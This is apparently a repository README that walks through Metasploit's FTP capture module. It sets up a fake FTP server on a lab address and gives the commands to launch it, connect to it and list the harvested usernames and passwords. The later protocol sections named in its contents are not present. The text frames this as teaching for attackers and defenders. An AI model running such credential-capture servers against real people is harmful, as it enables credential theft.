# Metasploit_Fake_services
# Capturing FTP Credentials with Metasploit

This repository contains a detailed guide on using the Metasploit framework to capture credentials by setting up fake servers for various protocols. The goal is to demonstrate how attackers can use Metasploit's auxiliary modules to gather credentials and how defenders can understand and mitigate such attacks.

## Table of Contents

- [Introduction](#introduction)
- [Requirements](#requirements)
- [Setup](#setup)
- [Configuration](#configuration)
- [Exploitation](#exploitation)
- [Verification](#verification)
- [Using Metasploit for Different Services](#using-metasploit-for-different-services)
  - [Telnet](#telnet)
  - [VNC](#vnc)
  - [SMB](#smb)
  - [HTTP Basic](#http-basic)
  - [SMTP](#smtp)
- [Security Considerations](#security-considerations)
- [Contributing](#contributing)
- [License](#license)

## Introduction

This guide explains how to use Metasploit's auxiliary modules to set up fake servers and capture credentials from unsuspecting victims. The process includes configuring the Metasploit modules, launching the fake servers, and using various tools to test the setup.

## Requirements

- Metasploit Framework installed
- Kali Linux or any Linux distribution with Metasploit
- Basic understanding of various network protocols and Metasploit

## Setup

1. **Install Metasploit Framework** (if not already installed):

    ```bash
    sudo apt update
    sudo apt install metasploit-framework
    ```
2. **Start Metasploit Console**:

    ```bash
    msfconsole
    ```
    ## Configuration

### FTP

1. **Select the FTP Capture Module**:

    ```bash
    use auxiliary/server/capture/ftp
    ```

2. **Set the Server Host**:

    ```bash
    set SRVHOST 192.168.23.128
    ```

3. **Set a Custom Banner**:

    ```bash
    set BANNER "Welcome"
    ```

4. **Launch the Fake FTP Server**:

    ```bash
    exploit
    ```
## Exploitation

1. **Verify the Fake Server is Running**:

    Use Nmap to scan for the open FTP port (21):

    ```bash
    nmap -p21 192.168.23.128
    ```

2. **Connect to the Fake FTP Server**:

    Use an FTP client to connect to the fake server:

    ```bash
    ftp 192.168.23.128
    ```

3. **Enter Username and Password**:

    When prompted, enter any username and password. These credentials will be captured by the fake server.

## Verification

1. **Check Captured Credentials**:

    In the Metasploit console, view the captured credentials:

    ```bash
    creds
    ```

    You should see the username and password entered during the FTP connection.

